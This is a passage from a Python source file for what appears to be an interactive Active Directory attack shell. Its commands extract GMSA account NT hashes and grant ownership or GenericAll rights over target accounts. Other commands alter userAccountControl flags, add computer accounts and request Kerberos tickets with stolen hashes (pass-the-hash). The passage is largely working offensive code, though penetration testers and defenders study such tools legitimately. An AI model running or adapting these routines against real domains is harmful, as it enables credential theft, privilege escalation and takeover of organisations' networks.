                        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                        out = (proc.stdout or '') + (proc.stderr or '')
                        match = re.search(rf"Account:\s*{re.escape(target_gmsa)}\s+NTLM:\s*([a-fA-F0-9]{{32}})", out, re.IGNORECASE)
                        if match:
                            nt_hash = match.group(1).lower()
                            break
                    except FileNotFoundError:
                        continue
                    except subprocess.TimeoutExpired:
                        out = "[!] nxc timed out"
                        continue

                if nt_hash:
                    report_success(nt_hash)
                else:
                    print(f"[-] Could not extract GMSA password via fallback.")
                    print(f"[-] Ensure {target_gmsa} exists and you have 'ReadGmsaPassword' rights.")
                    if out:
                        print(f"[*] Tool output (last 10 lines):")
                        for line in out.strip().splitlines()[-10:]:
                            print(f"    {line}")

            except Exception as e:
                print(f"[-] Error retrieving GMSA Password: {e}")

        elif command[0] == "setowner":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("setowner <target_account>")
                continue
            target = command[1]
            session_username = current_session["username"]

            try:
                cmd_setowner(current_session["conn"], current_session["base_dn"], target, session_username)
            except Exception as e:
                print(f"[-] Error setting owner : {e}")
        elif command[0] == "genericall":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("genericall <target_account>")
                continue
            target = command[1]
            session_username = current_session["username"]

            try:
                cmd_genericall(current_session["conn"], current_session["base_dn"], target, session_username)
            except Exception as e:
                print(f"[-] Error adding Genericall: {e}")
        elif command[0] == "adduac":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("adduac <targetname> <FLAG>")
                continue
            try:
                ok = modify_uac(current_session["conn"], current_session["base_dn"], command[1], command[2].upper(), "add")
                if not ok and conn_failed_authz(current_session):
                    print_pac_hint(current_session)
            except Exception as e:
                print(f"[-] Error modifying UAC: {e}")
                if conn_failed_authz(current_session):
                    print_pac_hint(current_session)
        elif command[0] == "rmuac":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("rmuac <targetname> <FLAG>")
                continue
            try:
                ok = modify_uac(current_session["conn"], current_session["base_dn"], command[1], command[2].upper(), "remove")
                if not ok and conn_failed_authz(current_session):
                    print_pac_hint(current_session)
            except Exception as e:
                print(f"[-] Error modifying UAC: {e}")
                if conn_failed_authz(current_session):
                    print_pac_hint(current_session)
        elif command[0] == "addcomputer":
            if not current_session:
                print("No active session!")
                continue
            if len(command) < 3:
                print("addcomputer <computername> <password>")
                continue

            comp_name = command[1]
            comp_pass = command[2]

            try:
                add_computer(current_session["conn"], current_session["base_dn"], comp_name, comp_pass, current_session["domain"], current_session)
            except Exception as e:
                print(f"[-] Error adding computer: {e}")
        elif command[0] == "ldap":
            if len(command) < 2:
                print("ldap <ip>")
                continue
            target_ip = command[1]
            get_domain_info(target_ip)
        elif command[0] == "trusts":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            list_trusts(current_session["conn"], current_session["base_dn"])

        elif command[0] == "maq":
            if not current_session:
                print("No active session!")
                continue

            get_maq(current_session["conn"], current_session["base_dn"])

        elif command[0] == "checkpac":
            # Inspect the PAC (authorization data) the KDC puts in tickets for the
            # current user. PAC-less tickets make group-based rights unusable.
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if not current_session.get("kerberos"):
                print("[!] Session is not Kerberos - PAC inspection only applies to Kerberos sessions.")
                continue
            username = current_session["username"]
            nthash = current_session.get("nthash")
            if not nthash:
                password = current_session.get("password")
                if not password:
                    print("[-] Session has no password/hash; cannot request a fresh TGT to inspect the PAC.")
                    continue
                try:
                    import hashlib
                    nthash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
                except Exception as e:
                    print(f"[-] Could not derive NT hash from password: {e}")
                    continue
            try:
                from impacket.krb5.kerberosv5 import getKerberosTGT
                from impacket.krb5.types import Principal
                from impacket.krb5 import constants
                from impacket.krb5.crypto import Key, Enctype
                from impacket.krb5.asn1 import AS_REP
                from impacket.krb5.pac import PACTYPE, VALIDATION_INFO
                from pyasn1.codec.ber import decoder
                from binascii import unhexlify

                principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                print(f"[*] Requesting a fresh TGT for {username} to inspect the PAC...")
                tgt_bytes, cipher, old_key, sess_key = getKerberosTGT(principal, '', current_session['domain'].upper(), '', nthash, '', current_session['ip'])
                asrep = decoder.decode(tgt_bytes, asn1Spec=AS_REP())[0]
                key = Key(Enctype.RC4, unhexlify(nthash))
                data = cipher.decrypt(key, 3, bytes(asrep['enc-part']['cipher']))
                enc = decoder.decode(data)[0]
                pac_blob = None
                for i in range(len(enc)):
                    try:
                        for a in enc[i]:
                            if int(a[0]) == 128:
                                pac_blob = bytes(a[1])
                    except Exception:
                        pass

                if not pac_blob:
                    print(f"[bold red][-] NO PAC in the AS-REP for {username}![/bold red]")
                    print("[yellow]The KDC issues PAC-less tickets: the authorization data (group SIDs)[/yellow]")
                    print("[yellow]is missing, so rights granted VIA GROUP MEMBERSHIP cannot be used in this[/yellow]")
                    print("[yellow]session. Writes fail with insufficientAccessRights even if checkacl shows them.[/yellow]")
                    print("[yellow]Use an auth channel that maps the account directly (e.g. NTLM/certs if enabled),[/yellow]")
                    print("[yellow]or a principal whose grants are DIRECT instead of group-based.[/yellow]")
                    continue

                print(f"[bold green][+] PAC present in ticket for {username}. SIDs the DC will use for authz:[/bold green]")
                pac = PACTYPE(pac_blob)
                conn = current_session["conn"]
                base_dn = current_session["base_dn"]
                # resolve the domain SID from LDAP to map group RIDs to names
                domain_sid = None
                conn.search(base_dn, f"(sAMAccountName={username})", attributes=['objectSid'])
                if conn.entries:
                    full_sid = LDAP_SID(conn.entries[0].objectSid.raw_values[0]).formatCanonical()
                    domain_sid = full_sid.rsplit('-', 1)[0]
                for buf in pac['Buffers']:
                    if buf['BufferType'] != 1:
                        continue
                    vi = VALIDATION_INFO()
                    vi.fromString(buf.getData())
                    kv = vi['Data']['UserData']['Data']
                    try:
                        for g in kv['GroupIds']:
                            rid = int(g['RelativeId'])
                            sid = f"{domain_sid}-{rid}" if domain_sid else f"RID-{rid}"
                            print(f"    {sid}  {resolve_sid(conn, base_dn, sid)}")
                    except Exception as e:
                        print(f"    [!] Could not enumerate group SIDs: {e}")
                    try:
                        if kv['SidCount'] and kv['ExtraSids'] is not None:
                            for s in kv['ExtraSids']:
                                sid = s['Sid'].formatCanonical()
                                print(f"    {sid}  {resolve_sid(conn, base_dn, sid)}")
                    except Exception:
                        pass
            except Exception as e:
                print(f"[-] PAC check failed: {e}")

        elif command[0] == "exit":
            break
        else:
            print("Unknown command. Type 'help' for available commands.")
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="LDAP Shell")
    parser.add_argument('target', nargs='?', help='Target DC IP or Hostname')
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', default='', help='Password')
    parser.add_argument('-d', '--domain', help='Domain')
    parser.add_argument('-H', '--hash', help='NT Hash')
    parser.add_argument('-k', '--kerberos', action='store_true', help='Use Kerberos authentication')
    parser.add_argument('-T', '--ticket', help='ccache/kirbi ticket file to reuse (like nxc --use-kcache)')
    parser.add_argument('--ldaps', action='store_true', help='Use LDAPS (SSL)')
    args, unknown = parser.parse_known_args()

    initial_cmd = None
    if args.ticket and args.target:
        initial_cmd = ["use_ticket", args.ticket, args.target] + ([args.domain] if args.domain else [])
    elif args.username and args.target:
        domain = args.domain or args.target
        if args.kerberos and args.hash:
            initial_cmd = ["connectk_hash", args.username, args.hash, domain, args.target]
        elif args.kerberos:
            initial_cmd = ["connectk", args.username, args.password, domain, args.target]
        elif args.hash:
            initial_cmd = ["connect_hash", args.username, args.hash, domain, args.target]
        elif args.ldaps:
            initial_cmd = ["connectssl", args.username, args.password, domain, args.target]
        else:
            initial_cmd = ["connect", args.username, args.password, domain, args.target]

    try:
        connect(initial_cmd)
    except (KeyboardInterrupt, EOFError):
        print()
